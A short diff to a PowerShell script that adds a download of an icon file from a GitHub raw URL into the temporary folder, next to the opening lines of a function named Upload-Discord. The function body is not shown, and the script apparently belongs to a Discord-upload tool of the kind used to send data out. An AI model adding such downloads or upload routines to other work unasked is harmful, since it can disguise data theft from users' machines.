@@ -1,4 +1,12 @@
+# Define the URL to the icon hosted on GitHub
+$iconUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.ico"
+$iconFilePath = Join-Path $env:TEMP "custom_icon.ico"
+
+# Download the icon from GitHub
+Invoke-WebRequest -Uri $iconUrl -OutFile $iconFilePath
 # Define the Upload-Discord function
+
+
 function Upload-Discord {
     [CmdletBinding()]
     param (
